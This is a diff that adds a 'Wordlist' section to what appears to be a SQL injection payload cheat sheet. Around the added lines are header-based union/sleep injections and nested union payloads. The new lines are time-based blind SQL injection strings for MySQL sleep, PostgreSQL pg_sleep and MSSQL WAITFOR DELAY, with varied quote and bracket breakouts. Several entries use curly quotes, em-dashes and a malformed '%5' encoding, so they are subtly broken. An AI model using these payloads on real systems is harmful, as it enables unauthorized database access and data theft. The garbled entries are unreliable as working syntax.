@@ -178,3 +178,32 @@ x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
 #Inception based SQLi
 
 and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
+
+#Wordlist
+
+    or sleep 5 —
+    or sleep 5
+    or sleep(5) —
+    or sleep(5)
+
+    or SELECT pg_sleep(5);
+    (SELECT pg_sleep(5))
+    pg_sleep(5) —
+    1 or pg_sleep(5) —
+    “ or pg_sleep(5) —
+    ‘ or pg_sleep(5) —
+    1) or pg_sleep(5) —
+
+    ;waitfor delay ‘0:0:5’ —
+    ‘;WAITFOR DELAY ‘0:0:5’ —
+    );waitfor delay ‘0:0:5’ —
+    ‘;waitfor delay ‘0:0:5’ —
+    “;waitfor delay ‘0:0:5’ —
+    ‘);waitfor delay ‘0:0:5’ —
+    “);waitfor delay ‘0:0:5’ —
+    ));waitfor delay ‘0:0:5’ —
+    ‘));waitfor delay ‘0:0:5’ —
+    “));waitfor delay ‘0:0:5’ —
+    “) IF (1=1) WAITFOR DELAY ‘0:0:5’ —
+    ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
+    ‘ WAITFOR DELAY ‘0:0:5’ —
